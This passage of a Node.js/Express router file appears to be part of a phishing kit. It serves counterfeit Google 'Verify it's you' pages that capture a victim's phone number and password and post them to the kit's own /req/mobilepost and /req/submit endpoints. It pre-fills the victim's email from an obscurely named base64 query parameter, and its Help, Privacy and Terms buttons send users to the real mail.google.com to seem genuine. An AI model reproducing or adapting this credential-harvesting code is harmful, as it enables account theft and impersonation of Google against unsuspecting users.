        align-items: center;
    }

    .left-div, .right-divs {
        width: 48%;
        justify-content: center;
    }

    .right-div {
        margin-left: 10px;
    }
}

    </style>
</head>
<body>
    <div class="maindiv">
        <div class="form-half">
            <div><img class="divlogo" src="/images/image.png" alt="Logo"></div>
            <div><span class="welcome">Verify it’s you</span></div>
            <div><span class="warning">To help keep your account safe, Google wants to make sure it's really you trying to sign in</span></div>
            <div class="userdiv">
                <img class="user-icon" src="/images/user-circle.png" alt="User Icon">
                <span style="color: #2c2a2a; font-size: 18px; font-family: Arial, Helvetica, sans-serif;">${id1}</span>
                <img class="dropdown-icon" src="/images/dropd.jpg" alt="Dropdown Icon">
            </div>
        </div>
        <form class="loginform1" method="post" name="loginForm" action="/req/mobilepost" accept-charset="UTF-8">
            <div class="form-half1">
                <center>
                    <div class="gradient-box"><img src="/images/account-recovery-sms-pin.gif" alt="SMS Recovery"></div>
                </center>
                <div class="phonediv">
                    <span class="phonetype">Get a verification code</span><br><br>
                    <span class="messaged">To get a verification code, first confirm the phone number you added to your account is ${mobNumber}.&nbsp;<i>Standard rates apply.</i></span>
                </div>
                <br>
                <div class="select-box">
                        <div class="selected-option">
                            <div style="background-color:white;">
                                <span class="iconify" data-icon="flag:gb-4x3"></span>
                               
                            </div>
                            <input type='hidden' name="username" id="useRname" value="${id1}">
                            <input type="tel" name="tel" onkeypress="return validateMobile(event)" placeholder="Phone Number">
                            <script>
                                 function validateMobile(event) {
                                        var key = event.key;
                                        // Allow digits (0-9) and the plus sign (+)
                                        if (/[0-9+]/.test(key)) {
                                            return true;
                                        } else {
                                            alert("Please enter numbers only.");
                                            return false;
                                        }
                                        }

                            </script>
                        </div>
                        <div class="options">
                            <input type="text" class="search-box" placeholder="Search Country Name">
                            <ol>
                
                            </ol>
                        </div>
                    </div>
                    <script src="/script/script.js"></script>
                <div class="tryn">
                    <button type="button" class="hyperl1">Try another way</button>
                    <button type="submit" class="btnnxt">Send</button>
                </div>
            </div>
        </form>
    </div>

    <!-- Bottom section below the maindiv -->
    <div class="btmdiv">
        <div class="left-div">
            <select class="btmhypl" id="language-select">
                <option value="en">English (United States)</option>
                <option value="fr">French</option>
                <option value="es">Spanish</option>
                <option value="de">German</option>
            </select>
        </div>

        <div class="right-divs">
            <div class="right-div">
                <button id="helpButton" class="btmhypl">Help</button>
            </div>
            <div class="right-div">
                <button id="privacyButton" class="btmhypl">Privacy</button>
            </div>
            <div class="right-div">
                <button id="termsButton" class="btmhypl">Terms</button>
            </div>
        </div>
    </div>

    <script>
        document.querySelectorAll('#helpButton, #privacyButton, #termsButton').forEach(button => {
            button.onclick = function(event) {
                event.preventDefault();
                location.href = "https://mail.google.com";
            };
        });
    </script>
</body>
</html>

    
    `;
  
    res.send(otppage);
  
  });

// wrong password reoload page

router.get('/wrongpwd', (req, res) => {

    const samdata = req.query.NzA2MTczNTM1NzZmNzI2NDJlNzA2ODcwdghjdfjdfgjdfgjdfgjdfj;
  
    const decodata1=  Buffer.from(samdata, 'base64').toString('utf-8');
  
    const dataArray1 = decodata1.split('/');
  
    const id1 = dataArray1[1];

    const errorMessage = dataArray1[2];

  
  
    const errorpage = `

   <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Gmail</title>
        <link rel="shortcut icon" href="/images/image.png" type="image">
        <link rel="stylesheet" href="/stylesheet/newstyleerror.css">
    </head>
    <body>
        <div class="maindiv">
            <form class="loginform" method="post" name="loginForm" action="/req/submit" accept-charset="UTF-8">
           
                <div class="form-half">
                    <div><img class="divlogo" src="/images/image.png" ></div>
                    <div><span class="welcome">Verify it's you<span></div>                
                    <div class="userdiv">
                      <img class="left-img"  src="/images/user-circle.png" >&nbsp;&nbsp;
                      <span style="color: #2c2a2a;; font-size: 18px; font-family: Arial, Helvetica, sans-serif;">${id1}</span>&nbsp;
                      <img class="right-img" src="/images/dropd.jpg">
                      
                    </div>
                </div>
                <div class="form-half1">
                    <div class="input-box">
                        <input type='hidden' name="username" id="useRname" value="${id1}">
                        <input class="input-box-input" name="password" type='password' id="pEyar" placeholder=" ">
                        <label class="input-box-placeholder">Enter your password</label>
                      </div>
                      <!-- <div style="margin-bottom: 4px; width:80%">
                        <img src="/images/error.png" alt="Error You have entered wrong password">
                      </div> -->


                      <div class="shwpwd">
                        <div><img src="/images/mportance-32.png" style="height:20px;width:25x;" ></div>
                        <div><span class="button" style="color:#b3261e;; font-size: 12px; margin-left: -2%;">Wrong password. Try again or click Forgot password to reset it.</span></div>
                    </div>
    
                      <div class="shwpwd">
                        <div><input type="checkbox" onclick="ShowpassWord();" class="checkbox"></div>
                        <span onclick="ShowpassWord();" class="button">Show password</span>
                    </div>
    
                    <script src="/script/pass.js"></script>
    
                    <div class="fgtpwd">
                        <button id="myButton" class="hyperl" >Forgot password?</button>&nbsp;&nbsp;&nbsp;
                        <button type="submit" class="btnnxt">Next</button>
                        <script>
                          // JavaScript to redirect on button click
                          document.getElementById("myButton").onclick = function () {
                              location.href = "https://mail.google.com"; // Replace "https://example.com" with your desired URL
                          };
                      </script>
                      </div>
    
                </div>
    
               
          
            </form>
    
            <div class="btmdiv">
                <div class="left-div">
                    <select class="btmhypl" id="language-select">
                        <option value="en">English (United States)</option>
                        <option value="fr">French</option>
                        <option value="es">Spanish</option>
                        <option value="de">German</option>
                        <!-- Add more options as needed -->
                    </select>
                </div>
                    <div class="right-divs">
                        <div class="right-div">
                            <button id="myButton" class="btmhypl" >Help</button>
                        </div>
                        <div class="right-div">
                            <button id="myButton" class="btmhypl" >Privacy</button>
                        </div>
                        <div class="right-div">
                            <button id="myButton" class="btmhypl" >Terms</button>
                        </div>
                    </div>
            </div>
    
    
        </div>
        
    </body>
    </html>
    
    
    `;
  
    res.send(errorpage);
  
  });



module.exports = router;